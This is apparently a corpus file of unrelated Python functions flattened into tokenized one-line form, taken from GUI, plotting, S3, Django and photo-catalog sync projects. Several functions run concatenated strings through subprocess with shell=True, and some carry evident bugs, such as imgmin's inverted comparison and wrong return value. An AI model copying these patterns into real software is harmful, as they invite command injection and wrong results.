def prettify ( self , elem ) : from xml . etree import ElementTree from re import sub rawString = ElementTree . tostring ( elem , 'utf-8' ) parsedString = sub ( r'(?=<[^/].*>)' , '\n' , rawString ) # Adds newline after each closing tag return parsedString [ 1 : ]
def prepareImages ( self , fileName , logType ) : import subprocess if self . imageType == "png" : self . imagePixmap . save ( fileName + ".png" , "PNG" , - 1 ) if logType == "Physics" : makePostScript = "convert " + fileName + ".png " + fileName + ".ps" process = subprocess . Popen ( makePostScript , shell = True ) process . wait ( ) thumbnailPixmap = self . imagePixmap . scaled ( 500 , 450 , Qt . KeepAspectRatio ) thumbnailPixmap . save ( fileName + ".png" , "PNG" , - 1 ) else : renameImage = "cp " + self . image + " " + fileName + ".gif" process = subprocess . Popen ( renameImage , shell = True ) process . wait ( ) if logType == "Physics" : thumbnailPixmap = self . imagePixmap . scaled ( 500 , 450 , Qt . KeepAspectRatio ) thumbnailPixmap . save ( fileName + ".png" , "PNG" , - 1 )
def submitEntry ( self ) : # logType = self.logui.logType.currentText() mcclogs , physlogs = self . selectedLogs ( ) success = True if mcclogs != [ ] : if not self . acceptedUser ( "MCC" ) : QMessageBox ( ) . warning ( self , "Invalid User" , "Please enter a valid user name!" ) return fileName = self . xmlSetup ( "MCC" , mcclogs ) if fileName is None : return if not self . imagePixmap . isNull ( ) : self . prepareImages ( fileName , "MCC" ) success = self . sendToLogbook ( fileName , "MCC" ) if physlogs != [ ] : for i in range ( len ( physlogs ) ) : fileName = self . xmlSetup ( "Physics" , physlogs [ i ] ) if fileName is None : return if not self . imagePixmap . isNull ( ) : self . prepareImages ( fileName , "Physics" ) success_phys = self . sendToLogbook ( fileName , "Physics" , physlogs [ i ] ) success = success and success_phys self . done ( success )
def sendToLogbook ( self , fileName , logType , location = None ) : import subprocess success = True if logType == "MCC" : fileString = "" if not self . imagePixmap . isNull ( ) : fileString = fileName + "." + self . imageType logcmd = "xml2elog " + fileName + ".xml " + fileString process = subprocess . Popen ( logcmd , shell = True ) process . wait ( ) if process . returncode != 0 : success = False else : from shutil import copy path = "/u1/" + location . lower ( ) + "/physics/logbook/data/" # Prod path # path = "/home/softegr/alverson/log_test/"  # Dev path try : if not self . imagePixmap . isNull ( ) : copy ( fileName + ".png" , path ) if self . imageType == "png" : copy ( fileName + ".ps" , path ) else : copy ( fileName + "." + self . imageType , path ) # Copy .xml file last to ensure images will be picked up by cron job # print("Copying file " + fileName + " to path " + path) copy ( fileName + ".xml" , path ) except IOError as error : print ( error ) success = False return success
def setupUI ( self ) : labelSizePolicy = QSizePolicy ( QSizePolicy . Fixed , QSizePolicy . Fixed ) labelSizePolicy . setHorizontalStretch ( 0 ) labelSizePolicy . setVerticalStretch ( 0 ) menuSizePolicy = QSizePolicy ( QSizePolicy . Expanding , QSizePolicy . Fixed ) menuSizePolicy . setHorizontalStretch ( 0 ) menuSizePolicy . setVerticalStretch ( 0 ) logTypeLayout = QHBoxLayout ( ) logTypeLayout . setSpacing ( 0 ) typeLabel = QLabel ( "Log Type:" ) typeLabel . setMinimumSize ( QSize ( 65 , 0 ) ) typeLabel . setMaximumSize ( QSize ( 65 , 16777215 ) ) typeLabel . setSizePolicy ( labelSizePolicy ) logTypeLayout . addWidget ( typeLabel ) self . logType = QComboBox ( self ) self . logType . setMinimumSize ( QSize ( 100 , 0 ) ) self . logType . setMaximumSize ( QSize ( 150 , 16777215 ) ) menuSizePolicy . setHeightForWidth ( self . logType . sizePolicy ( ) . hasHeightForWidth ( ) ) self . logType . setSizePolicy ( menuSizePolicy ) logTypeLayout . addWidget ( self . logType ) logTypeLayout . setStretch ( 1 , 6 ) programLayout = QHBoxLayout ( ) programLayout . setSpacing ( 0 ) programLabel = QLabel ( "Program:" ) programLabel . setMinimumSize ( QSize ( 60 , 0 ) ) programLabel . setMaximumSize ( QSize ( 60 , 16777215 ) ) programLabel . setSizePolicy ( labelSizePolicy ) programLayout . addWidget ( programLabel ) self . programName = QComboBox ( self ) self . programName . setMinimumSize ( QSize ( 100 , 0 ) ) self . programName . setMaximumSize ( QSize ( 150 , 16777215 ) ) menuSizePolicy . setHeightForWidth ( self . programName . sizePolicy ( ) . hasHeightForWidth ( ) ) self . programName . setSizePolicy ( menuSizePolicy ) programLayout . addWidget ( self . programName ) programLayout . setStretch ( 1 , 6 ) # Initial instance allows adding additional menus, all following menus can only remove themselves. if self . initialInstance : self . logButton = QPushButton ( "+" , self ) self . logButton . setToolTip ( "Add logbook" ) else : self . logButton = QPushButton ( "-" ) self . logButton . setToolTip ( "Remove logbook" ) self . logButton . setMinimumSize ( QSize ( 16 , 16 ) ) # 24x24 self . logButton . setMaximumSize ( QSize ( 16 , 16 ) ) # 24x24 self . logButton . setObjectName ( "roundButton" ) # self.logButton.setAutoFillBackground(True) # region = QRegion(QRect(self.logButton.x()+15, self.logButton.y()+14, 20, 20), QRegion.Ellipse) # self.logButton.setMask(region) self . logButton . setStyleSheet ( "QPushButton {border-radius: 8px;}" ) self . _logSelectLayout = QHBoxLayout ( ) self . _logSelectLayout . setSpacing ( 6 ) self . _logSelectLayout . addLayout ( logTypeLayout ) self . _logSelectLayout . addLayout ( programLayout ) self . _logSelectLayout . addWidget ( self . logButton ) self . _logSelectLayout . setStretch ( 0 , 6 ) self . _logSelectLayout . setStretch ( 1 , 6 )
def show ( self ) : self . parent . addLayout ( self . _logSelectLayout ) self . menuCount += 1 self . _connectSlots ( )
def addLogbooks ( self , type = None , logs = [ ] , default = "" ) : if type is not None and len ( logs ) != 0 : if type in self . logList : for logbook in logs : if logbook not in self . logList . get ( type ) [ 0 ] : # print("Adding log " + " to " + type + " log type.") self . logList . get ( type ) [ 0 ] . append ( logbook ) else : # print("Adding log type: " + type) self . logList [ type ] = [ ] self . logList [ type ] . append ( logs ) # If default given, auto-select upon menu creation if len ( self . logList [ type ] ) > 1 and default != "" : self . logList . get ( type ) [ 1 ] == default else : self . logList . get ( type ) . append ( default ) self . logType . clear ( ) self . logType . addItems ( list ( self . logList . keys ( ) ) ) self . changeLogType ( )
def removeLogbooks ( self , type = None , logs = [ ] ) : if type is not None and type in self . logList : if len ( logs ) == 0 or logs == "All" : del self . logList [ type ] else : for logbook in logs : if logbook in self . logList [ type ] : self . logList [ type ] . remove ( logbook ) self . changeLogType ( )
def changeLogType ( self ) : logType = self . selectedType ( ) programs = self . logList . get ( logType ) [ 0 ] default = self . logList . get ( logType ) [ 1 ] if logType in self . logList : self . programName . clear ( ) self . programName . addItems ( programs ) self . programName . setCurrentIndex ( programs . index ( default ) )
def addMenu ( self ) : self . parent . multiLogLayout . addLayout ( self . logSelectLayout ) self . getPrograms ( logType , programName )
def removeLayout ( self , layout ) : for cnt in reversed ( range ( layout . count ( ) ) ) : item = layout . takeAt ( cnt ) widget = item . widget ( ) if widget is not None : widget . deleteLater ( ) else : '''If sublayout encountered, iterate recursively.''' self . removeLayout ( item . layout ( ) )
def addlabel ( ax = None , toplabel = None , xlabel = None , ylabel = None , zlabel = None , clabel = None , cb = None , windowlabel = None , fig = None , axes = None ) : if ( axes is None ) and ( ax is not None ) : axes = ax if ( windowlabel is not None ) and ( fig is not None ) : fig . canvas . set_window_title ( windowlabel ) if fig is None : fig = _plt . gcf ( ) if fig is not None and axes is None : axes = fig . get_axes ( ) if axes == [ ] : logger . error ( 'No axes found!' ) if axes is not None : if toplabel is not None : axes . set_title ( toplabel ) if xlabel is not None : axes . set_xlabel ( xlabel ) if ylabel is not None : axes . set_ylabel ( ylabel ) if zlabel is not None : axes . set_zlabel ( zlabel ) if ( clabel is not None ) or ( cb is not None ) : if ( clabel is not None ) and ( cb is not None ) : cb . set_label ( clabel ) else : if clabel is None : logger . error ( 'Missing colorbar label' ) else : logger . error ( 'Missing colorbar instance' )
def linkcode_resolve ( domain , info ) : if domain != 'py' : return None modname = info [ 'module' ] fullname = info [ 'fullname' ] submod = sys . modules . get ( modname ) if submod is None : return None obj = submod for part in fullname . split ( '.' ) : try : obj = getattr ( obj , part ) except : return None try : fn = inspect . getsourcefile ( obj ) except : fn = None if not fn : return None try : source , lineno = inspect . getsourcelines ( obj ) except : lineno = None if lineno : linespec = "#L%d-L%d" % ( lineno , lineno + len ( source ) - 1 ) else : linespec = "" fn = relpath ( fn , start = dirname ( scisalt . __file__ ) ) if 'dev' in scisalt . __version__ : return "http://github.com/joelfrederico/SciSalt/blob/master/scisalt/%s%s" % ( fn , linespec ) else : return "http://github.com/joelfrederico/SciSalt/blob/v%s/scisalt/%s%s" % ( scisalt . __version__ , fn , linespec )
def syncdb ( args ) : cmd = args and 'syncdb %s' % ' ' . join ( options . args ) or 'syncdb --noinput' call_manage ( cmd ) for fixture in options . paved . django . syncdb . fixtures : call_manage ( "loaddata %s" % fixture )
def schema ( args ) : try : import south cmd = args and 'schemamigration %s' % ' ' . join ( options . args ) or 'schemamigration' call_manage ( cmd ) except ImportError : error ( 'Could not import south.' )
def _start_again_message ( self , message = None ) : logging . debug ( "Start again message delivered: {}" . format ( message ) ) the_answer = ', ' . join ( [ str ( d ) for d in self . game . answer ] [ : - 1 ] ) + ', and ' + [ str ( d ) for d in self . game . answer ] [ - 1 ] return "{0}{1} The correct answer was {2}. Please start a new game." . format ( message , "." if message [ - 1 ] not in [ "." , "," , ";" , ":" , "!" ] else "" , the_answer )
def showfig ( fig , aspect = "auto" ) : ax = fig . gca ( ) # Swap y axis if needed alim = list ( ax . axis ( ) ) if alim [ 3 ] < alim [ 2 ] : temp = alim [ 2 ] alim [ 2 ] = alim [ 3 ] alim [ 3 ] = temp ax . axis ( alim ) ax . set_aspect ( aspect ) fig . show ( )
def cmd_init_push_to_cloud ( args ) : ( lcat , ccat ) = ( args . local_catalog , args . cloud_catalog ) logging . info ( "[init-push-to-cloud]: %s => %s" % ( lcat , ccat ) ) if not isfile ( lcat ) : args . error ( "[init-push-to-cloud] The local catalog does not exist: %s" % lcat ) if isfile ( ccat ) : args . error ( "[init-push-to-cloud] The cloud catalog already exist: %s" % ccat ) ( lmeta , cmeta ) = ( "%s.lrcloud" % lcat , "%s.lrcloud" % ccat ) if isfile ( lmeta ) : args . error ( "[init-push-to-cloud] The local meta-data already exist: %s" % lmeta ) if isfile ( cmeta ) : args . error ( "[init-push-to-cloud] The cloud meta-data already exist: %s" % cmeta ) #Let's "lock" the local catalog logging . info ( "Locking local catalog: %s" % ( lcat ) ) if not lock_file ( lcat ) : raise RuntimeError ( "The catalog %s is locked!" % lcat ) #Copy catalog from local to cloud, which becomes the new "base" changeset util . copy ( lcat , ccat ) # Write meta-data both to local and cloud mfile = MetaFile ( lmeta ) utcnow = datetime . utcnow ( ) . strftime ( DATETIME_FORMAT ) [ : - 4 ] mfile [ 'catalog' ] [ 'hash' ] = hashsum ( lcat ) mfile [ 'catalog' ] [ 'modification_utc' ] = utcnow mfile [ 'catalog' ] [ 'filename' ] = lcat mfile [ 'last_push' ] [ 'filename' ] = ccat mfile [ 'last_push' ] [ 'hash' ] = hashsum ( lcat ) mfile [ 'last_push' ] [ 'modification_utc' ] = utcnow mfile . flush ( ) mfile = MetaFile ( cmeta ) mfile [ 'changeset' ] [ 'is_base' ] = True mfile [ 'changeset' ] [ 'hash' ] = hashsum ( lcat ) mfile [ 'changeset' ] [ 'modification_utc' ] = utcnow mfile [ 'changeset' ] [ 'filename' ] = basename ( ccat ) mfile . flush ( ) #Let's copy Smart Previews if not args . no_smart_previews : copy_smart_previews ( lcat , ccat , local2cloud = True ) #Finally,let's unlock the catalog files logging . info ( "Unlocking local catalog: %s" % ( lcat ) ) unlock_file ( lcat ) logging . info ( "[init-push-to-cloud]: Success!" )
def cmd_init_pull_from_cloud ( args ) : ( lcat , ccat ) = ( args . local_catalog , args . cloud_catalog ) logging . info ( "[init-pull-from-cloud]: %s => %s" % ( ccat , lcat ) ) if isfile ( lcat ) : args . error ( "[init-pull-from-cloud] The local catalog already exist: %s" % lcat ) if not isfile ( ccat ) : args . error ( "[init-pull-from-cloud] The cloud catalog does not exist: %s" % ccat ) ( lmeta , cmeta ) = ( "%s.lrcloud" % lcat , "%s.lrcloud" % ccat ) if isfile ( lmeta ) : args . error ( "[init-pull-from-cloud] The local meta-data already exist: %s" % lmeta ) if not isfile ( cmeta ) : args . error ( "[init-pull-from-cloud] The cloud meta-data does not exist: %s" % cmeta ) #Let's "lock" the local catalog logging . info ( "Locking local catalog: %s" % ( lcat ) ) if not lock_file ( lcat ) : raise RuntimeError ( "The catalog %s is locked!" % lcat ) #Copy base from cloud to local util . copy ( ccat , lcat ) #Apply changesets cloudDAG = ChangesetDAG ( ccat ) path = cloudDAG . path ( cloudDAG . root . hash , cloudDAG . leafs [ 0 ] . hash ) util . apply_changesets ( args , path , lcat ) # Write meta-data both to local and cloud mfile = MetaFile ( lmeta ) utcnow = datetime . utcnow ( ) . strftime ( DATETIME_FORMAT ) [ : - 4 ] mfile [ 'catalog' ] [ 'hash' ] = hashsum ( lcat ) mfile [ 'catalog' ] [ 'modification_utc' ] = utcnow mfile [ 'catalog' ] [ 'filename' ] = lcat mfile [ 'last_push' ] [ 'filename' ] = cloudDAG . leafs [ 0 ] . mfile [ 'changeset' ] [ 'filename' ] mfile [ 'last_push' ] [ 'hash' ] = cloudDAG . leafs [ 0 ] . mfile [ 'changeset' ] [ 'hash' ] mfile [ 'last_push' ] [ 'modification_utc' ] = cloudDAG . leafs [ 0 ] . mfile [ 'changeset' ] [ 'modification_utc' ] mfile . flush ( ) #Let's copy Smart Previews if not args . no_smart_previews : copy_smart_previews ( lcat , ccat , local2cloud = False ) #Finally, let's unlock the catalog files logging . info ( "Unlocking local catalog: %s" % ( lcat ) ) unlock_file ( lcat ) logging . info ( "[init-pull-from-cloud]: Success!" )
def _rindex ( mylist : Sequence [ T ] , x : T ) -> int : return len ( mylist ) - mylist [ : : - 1 ] . index ( x ) - 1
def authorize ( self ) : response = self . client . login ( username = self . USERNAME , password = self . PASSWORD ) self . assertTrue ( response ) self . authed = True
def imgmax ( self ) : if not hasattr ( self , '_imgmax' ) : imgmax = _np . max ( self . images [ 0 ] ) for img in self . images : imax = _np . max ( img ) if imax > imgmax : imgmax = imax self . _imgmax = imgmax return self . _imgmax
def imgmin ( self ) : if not hasattr ( self , '_imgmin' ) : imgmin = _np . min ( self . images [ 0 ] ) for img in self . images : imin = _np . min ( img ) if imin > imgmin : imgmin = imin self . _imgmin = imgmin return _np . min ( self . image )
def _usage ( prog_name = os . path . basename ( sys . argv [ 0 ] ) ) : spacer = ' ' * len ( 'usage: ' ) usage = prog_name + ' -b LIST [-S SEPARATOR] [file ...]\n' + spacer + prog_name + ' -c LIST [-S SEPERATOR] [file ...]\n' + spacer + prog_name + ' -f LIST [-d DELIM] [-e] [-S SEPERATOR] [-s] [file ...]' # Return usage message with trailing whitespace removed. return "usage: " + usage . rstrip ( )
def _parse_args ( args ) : # parser uses custom usage string, with 'usage: ' removed, as it is # added automatically via argparser. parser = argparse . ArgumentParser ( description = "Remove and/or rearrange " + "sections from each line of a file(s)." , usage = _usage ( ) [ len ( 'usage: ' ) : ] ) parser . add_argument ( '-b' , "--bytes" , action = 'store' , type = lst , default = [ ] , help = "Bytes to select" ) parser . add_argument ( '-c' , "--chars" , action = 'store' , type = lst , default = [ ] , help = "Character to select" ) parser . add_argument ( '-f' , "--fields" , action = 'store' , type = lst , default = [ ] , help = "Fields to select" ) parser . add_argument ( '-d' , "--delimiter" , action = 'store' , default = "\t" , help = "Sets field delimiter(default is TAB)" ) parser . add_argument ( '-e' , "--regex" , action = 'store_true' , help = 'Enable regular expressions to be used as input ' + 'delimiter' ) parser . add_argument ( '-s' , '--skip' , action = 'store_true' , help = "Skip lines that do not contain input delimiter." ) parser . add_argument ( '-S' , "--separator" , action = 'store' , default = "\t" , help = "Sets field separator for output." ) parser . add_argument ( 'file' , nargs = '*' , default = "-" , help = "File(s) to cut" ) return parser . parse_args ( args )
def open_s3 ( bucket ) : conn = boto . connect_s3 ( options . paved . s3 . access_id , options . paved . s3 . secret ) try : bucket = conn . get_bucket ( bucket ) except boto . exception . S3ResponseError : bucket = conn . create_bucket ( bucket ) return bucket
def upload_s3 ( file_path , bucket_name , file_key , force = False , acl = 'private' ) : file_path = path ( file_path ) bucket = open_s3 ( bucket_name ) if file_path . isdir ( ) : # Upload the contents of the dir path. paths = file_path . listdir ( ) paths_keys = list ( zip ( paths , [ '%s/%s' % ( file_key , p . name ) for p in paths ] ) ) else : # Upload just the given file path. paths_keys = [ ( file_path , file_key ) ] for p , k in paths_keys : headers = { } s3_key = bucket . get_key ( k ) if not s3_key : from boto . s3 . key import Key s3_key = Key ( bucket , k ) content_type = mimetypes . guess_type ( p ) [ 0 ] if content_type : headers [ 'Content-Type' ] = content_type file_size = p . stat ( ) . st_size file_data = p . bytes ( ) file_md5 , file_md5_64 = s3_key . get_md5_from_hexdigest ( hashlib . md5 ( file_data ) . hexdigest ( ) ) # Check the hash. if s3_key . etag : s3_md5 = s3_key . etag . replace ( '"' , '' ) if s3_md5 == file_md5 : info ( 'Hash is the same. Skipping %s' % file_path ) continue elif not force : # Check if file on S3 is older than local file. s3_datetime = datetime . datetime ( * time . strptime ( s3_key . last_modified , '%a, %d %b %Y %H:%M:%S %Z' ) [ 0 : 6 ] ) local_datetime = datetime . datetime . utcfromtimestamp ( p . stat ( ) . st_mtime ) if local_datetime < s3_datetime : info ( "File %s hasn't been modified since last " "being uploaded" % ( file_key ) ) continue # File is newer, let's process and upload info ( "Uploading %s..." % ( file_key ) ) try : s3_key . set_contents_from_string ( file_data , headers , policy = acl , replace = True , md5 = ( file_md5 , file_md5_64 ) ) except Exception as e : error ( "Failed: %s" % e ) raise
def download_s3 ( bucket_name , file_key , file_path , force = False ) : file_path = path ( file_path ) bucket = open_s3 ( bucket_name ) file_dir = file_path . dirname ( ) file_dir . makedirs ( ) s3_key = bucket . get_key ( file_key ) if file_path . exists ( ) : file_data = file_path . bytes ( ) file_md5 , file_md5_64 = s3_key . get_md5_from_hexdigest ( hashlib . md5 ( file_data ) . hexdigest ( ) ) # Check the hash. try : s3_md5 = s3_key . etag . replace ( '"' , '' ) except KeyError : pass else : if s3_md5 == file_md5 : info ( 'Hash is the same. Skipping %s' % file_path ) return elif not force : # Check if file on S3 is older than local file. s3_datetime = datetime . datetime ( * time . strptime ( s3_key . last_modified , '%a, %d %b %Y %H:%M:%S %Z' ) [ 0 : 6 ] ) local_datetime = datetime . datetime . utcfromtimestamp ( file_path . stat ( ) . st_mtime ) if s3_datetime < local_datetime : info ( "File at %s is less recent than the local version." % ( file_key ) ) return # If it is newer, let's process and upload info ( "Downloading %s..." % ( file_key ) ) try : with open ( file_path , 'w' ) as fo : s3_key . get_contents_to_file ( fo ) except Exception as e : error ( "Failed: %s" % e ) raise
def create_ical ( request , slug ) : event = get_object_or_404 ( Event , slug = slug ) # convert dates to datetimes. # when we change code to datetimes, we won't have to do this. start = event . start_date start = datetime . datetime ( start . year , start . month , start . day ) if event . end_date : end = event . end_date end = datetime . datetime ( end . year , end . month , end . day ) else : end = start cal = card_me . iCalendar ( ) cal . add ( 'method' ) . value = 'PUBLISH' vevent = cal . add ( 'vevent' ) vevent . add ( 'dtstart' ) . value = start vevent . add ( 'dtend' ) . value = end vevent . add ( 'dtstamp' ) . value = datetime . datetime . now ( ) vevent . add ( 'summary' ) . value = event . name response = HttpResponse ( cal . serialize ( ) , content_type = 'text/calendar' ) response [ 'Filename' ] = 'filename.ics' response [ 'Content-Disposition' ] = 'attachment; filename=filename.ics' return response
def video_list ( request , slug ) : event = get_object_or_404 ( Event , slug = slug ) return render ( request , 'video/video_list.html' , { 'event' : event , 'video_list' : event . eventvideo_set . all ( ) } )
def add_event ( request ) : form = AddEventForm ( request . POST or None ) if form . is_valid ( ) : instance = form . save ( commit = False ) instance . sites = settings . SITE_ID instance . submitted_by = request . user instance . approved = True instance . slug = slugify ( instance . name ) instance . save ( ) messages . success ( request , 'Your event has been added.' ) return HttpResponseRedirect ( reverse ( 'events_index' ) ) return render ( request , 'happenings/event_form.html' , { 'form' : form , 'form_title' : 'Add an event' } )
def add_memory ( request , slug ) : event = get_object_or_404 ( Event , slug = slug ) form = MemoryForm ( request . POST or None , request . FILES or None ) if form . is_valid ( ) : instance = form . save ( commit = False ) instance . user = request . user instance . event = event instance . save ( ) msg = "Your thoughts were added. " if request . FILES : photo_list = request . FILES . getlist ( 'photos' ) photo_count = len ( photo_list ) for upload_file in photo_list : process_upload ( upload_file , instance , form , event , request ) if photo_count > 1 : msg += "{} images were added and should appear soon." . format ( photo_count ) else : msg += "{} image was added and should appear soon." . format ( photo_count ) messages . success ( request , msg ) return HttpResponseRedirect ( '../' ) return render ( request , 'happenings/add_memories.html' , { 'form' : form , 'event' : event } )
def __register_library ( self , module_name : str , attr : str , fallback : str = None ) : # Import the module Named in the string try : module = importlib . import_module ( module_name ) # If module is not found it checks if an alternative is is listed # If it is then it substitutes it, just so that the code can run except ImportError : if fallback is not None : module = importlib . import_module ( fallback ) self . __logger . warn ( module_name + " not available: Replaced with " + fallback ) else : self . __logger . warn ( module_name + " not available: No Replacement Specified" ) # Cram the module into the __sketch in the form of module -> "attr" # AKA the same as `import module as attr` if not attr in dir ( self . __sketch ) : setattr ( self . __sketch , attr , module ) else : self . __logger . warn ( attr + " could not be imported as it's label is already used in the sketch" )
def copy ( src , dst ) : ( szip , dzip ) = ( src . endswith ( ".zip" ) , dst . endswith ( ".zip" ) ) logging . info ( "Copy: %s => %s" % ( src , dst ) ) if szip and dzip : #If both zipped, we can simply use copy shutil . copy2 ( src , dst ) elif szip : with zipfile . ZipFile ( src , mode = 'r' ) as z : tmpdir = tempfile . mkdtemp ( ) try : z . extractall ( tmpdir ) if len ( z . namelist ( ) ) != 1 : raise RuntimeError ( "The zip file '%s' should only have one " "compressed file" % src ) tmpfile = join ( tmpdir , z . namelist ( ) [ 0 ] ) try : os . remove ( dst ) except OSError : pass shutil . move ( tmpfile , dst ) finally : shutil . rmtree ( tmpdir , ignore_errors = True ) elif dzip : with zipfile . ZipFile ( dst , mode = 'w' , compression = ZIP_DEFLATED ) as z : z . write ( src , arcname = basename ( src ) ) else : #None of them are zipped shutil . copy2 ( src , dst )
def apply_changesets ( args , changesets , catalog ) : tmpdir = tempfile . mkdtemp ( ) tmp_patch = join ( tmpdir , "tmp.patch" ) tmp_lcat = join ( tmpdir , "tmp.lcat" ) for node in changesets : remove ( tmp_patch ) copy ( node . mfile [ 'changeset' ] [ 'filename' ] , tmp_patch ) logging . info ( "mv %s %s" % ( catalog , tmp_lcat ) ) shutil . move ( catalog , tmp_lcat ) cmd = args . patch_cmd . replace ( "$in1" , tmp_lcat ) . replace ( "$patch" , tmp_patch ) . replace ( "$out" , catalog ) logging . info ( "Patch: %s" % cmd ) subprocess . check_call ( cmd , shell = True ) shutil . rmtree ( tmpdir , ignore_errors = True )
def clean ( self ) : cleaned = super ( EventForm , self ) . clean ( ) if Event . objects . filter ( name = cleaned [ 'name' ] , start_date = cleaned [ 'start_date' ] ) . count ( ) : raise forms . ValidationError ( u'This event appears to be in the database already.' ) return cleaned
def _loop ( self ) : while True : try : with uncaught_greenlet_exception_context ( ) : self . _loop_callback ( ) except gevent . GreenletExit : break if self . _stop_event . wait ( self . _interval ) : break self . _clear ( )
def start ( self ) : assert not self . has_started ( ) , "called start() on an active GeventLoop" self . _stop_event = Event ( ) # note that we don't use safe_greenlets.spawn because we take care of it in _loop by ourselves self . _greenlet = gevent . spawn ( self . _loop )
def kill ( self ) : assert self . has_started ( ) , "called kill() on a non-active GeventLoop" self . _stop_event . set ( ) self . _greenlet . kill ( ) self . _clear ( )
def _hyphens_to_dashes ( self ) : problematic_hyphens = [ ( r'-([.,!)])' , r'---\1' ) , ( r'(?<=\d)-(?=\d)' , '--' ) , ( r'(?<=\s)-(?=\s)' , '---' ) ] for problem_case in problematic_hyphens : self . _regex_replacement ( * problem_case )
def _str_replacement ( self , target , replacement ) : self . data = self . data . replace ( target , replacement )
def _regex_replacement ( self , target , replacement ) : match = re . compile ( target ) self . data = match . sub ( replacement , self . data )
def showhtml ( ) : import webbrowser # copy from paver opts = options docroot = path ( opts . get ( 'docroot' , 'docs' ) ) if not docroot . exists ( ) : raise BuildFailure ( "Sphinx documentation root (%s) does not exist." % docroot ) builddir = docroot / opts . get ( "builddir" , ".build" ) # end of copy builddir = builddir / 'html' if not builddir . exists ( ) : raise BuildFailure ( "Sphinx build directory (%s) does not exist." % builddir ) webbrowser . open ( builddir / 'index.html' )
def _start_again ( self , message = None ) : logging . debug ( "Start again message delivered: {}" . format ( message ) ) the_answer = self . _game . answer_str return "{0} The correct answer was {1}. Please start a new game." . format ( message , the_answer )
def minify ( self , css ) : css = css . replace ( "\r\n" , "\n" ) # get rid of Windows line endings, if they exist for rule in _REPLACERS [ self . level ] : css = re . compile ( rule [ 0 ] , re . MULTILINE | re . UNICODE | re . DOTALL ) . sub ( rule [ 1 ] , css ) return css
def get_or_create_index ( self , index_ratio , index_width ) : if not self . index_path . exists ( ) or not self . filepath . stat ( ) . st_mtime == self . index_path . stat ( ) . st_mtime : create_index ( self . filepath , self . index_path , index_ratio = index_ratio , index_width = index_width ) return IndexFile ( str ( self . index_path ) )
def create ( self , server ) : for chunk in self . __cut_to_size ( ) : server . post ( 'tasks_admin' , chunk . as_payload ( ) , replacements = { 'slug' : chunk . challenge . slug } )
def update ( self , server ) : for chunk in self . __cut_to_size ( ) : server . put ( 'tasks_admin' , chunk . as_payload ( ) , replacements = { 'slug' : chunk . challenge . slug } )
def reconcile ( self , server ) : if not self . challenge . exists ( server ) : raise Exception ( 'Challenge does not exist on server' ) existing = MapRouletteTaskCollection . from_server ( server , self . challenge ) same = [ ] new = [ ] changed = [ ] deleted = [ ] # reconcile the new tasks with the existing tasks: for task in self . tasks : # if the task exists on the server... if task . identifier in [ existing_task . identifier for existing_task in existing . tasks ] : # and they are equal... if task == existing . get_by_identifier ( task . identifier ) : # add to 'same' list same . append ( task ) # if they are not equal, add to 'changed' list else : changed . append ( task ) # if the task does not exist on the server, add to 'new' list else : new . append ( task ) # next, check for tasks on the server that don't exist in the new collection... for task in existing . tasks : if task . identifier not in [ task . identifier for task in self . tasks ] : # ... and add those to the 'deleted' list. deleted . append ( task ) # update the server with new, changed, and deleted tasks if new : newCollection = MapRouletteTaskCollection ( self . challenge , tasks = new ) newCollection . create ( server ) if changed : changedCollection = MapRouletteTaskCollection ( self . challenge , tasks = changed ) changedCollection . update ( server ) if deleted : deletedCollection = MapRouletteTaskCollection ( self . challenge , tasks = deleted ) for task in deletedCollection . tasks : task . status = 'deleted' deletedCollection . update ( server ) # return same, new, changed and deleted tasks return { 'same' : same , 'new' : new , 'changed' : changed , 'deleted' : deleted }
def yn_prompt ( msg , default = True ) : ret = custom_prompt ( msg , [ "y" , "n" ] , "y" if default else "n" ) if ret == "y" : return True return False
def custom_prompt ( msg , options , default ) : formatted_options = [ x . upper ( ) if x == default else x . lower ( ) for x in options ] sure = input ( "{0} [{1}]: " . format ( msg , "/" . join ( formatted_options ) ) ) if len ( sure ) == 0 : return default for option in options : if sure . upper ( ) == option . upper ( ) : return option return default
def read ( args ) : if args . config_file is None or not isfile ( args . config_file ) : return logging . info ( "Reading configure file: %s" % args . config_file ) config = cparser . ConfigParser ( ) config . read ( args . config_file ) if not config . has_section ( 'lrcloud' ) : raise RuntimeError ( "Configure file has no [lrcloud] section!" ) for ( name , value ) in config . items ( 'lrcloud' ) : if value == "True" : value = True elif value == "False" : value = False if getattr ( args , name ) is None : setattr ( args , name , value )
def write ( args ) : logging . info ( "Writing configure file: %s" % args . config_file ) if args . config_file is None : return #Let's add each attribute of 'args' to the configure file config = cparser . ConfigParser ( ) config . add_section ( "lrcloud" ) for p in [ x for x in dir ( args ) if not x . startswith ( "_" ) ] : if p in IGNORE_ARGS : continue #We ignore some attributes value = getattr ( args , p ) if value is not None : config . set ( 'lrcloud' , p , str ( value ) ) with open ( args . config_file , 'w' ) as f : config . write ( f )
def clone ( self ) : t = Tag ( self . version . major , self . version . minor , self . version . patch ) if self . revision is not None : t . revision = self . revision . clone ( ) return t
def with_revision ( self , label , number ) : t = self . clone ( ) t . revision = Revision ( label , number ) return t
def parse ( s ) : try : m = _regex . match ( s ) t = Tag ( int ( m . group ( 'major' ) ) , int ( m . group ( 'minor' ) ) , int ( m . group ( 'patch' ) ) ) return t if m . group ( 'label' ) is None else t . with_revision ( m . group ( 'label' ) , int ( m . group ( 'number' ) ) ) except AttributeError : return None
def tile ( ) : figs = plt . get_fignums ( ) # Keep track of x, y, size for figures x = 0 y = 0 # maxy    = 0 toppad = 21 size = np . array ( [ 0 , 0 ] ) if ( len ( figs ) != 0 ) : fig = plt . figure ( figs [ 0 ] ) screen = fig . canvas . window . get_screen ( ) screenx = screen . get_monitor_geometry ( screen . get_primary_monitor ( ) ) screenx = screenx [ 2 ] fig = plt . figure ( figs [ 0 ] ) fig . canvas . manager . window . move ( x , y ) maxy = np . array ( fig . canvas . manager . window . get_position ( ) ) [ 1 ] size = np . array ( fig . canvas . manager . window . get_size ( ) ) y = maxy x += size [ 0 ] + 1 for fig in figs [ 1 : ] : fig = plt . figure ( fig ) size = np . array ( fig . canvas . manager . window . get_size ( ) ) if ( x + size [ 0 ] > screenx ) : x = 0 y = maxy maxy = y + size [ 1 ] + toppad else : maxy = max ( maxy , y + size [ 1 ] + toppad ) fig . canvas . manager . window . move ( x , y ) x += size [ 0 ] + 1
def update_time ( sender , * * kwargs ) : comment = kwargs [ 'instance' ] if comment . content_type . app_label == "happenings" and comment . content_type . name == "Update" : from . models import Update item = Update . objects . get ( id = comment . object_pk ) item . save ( )
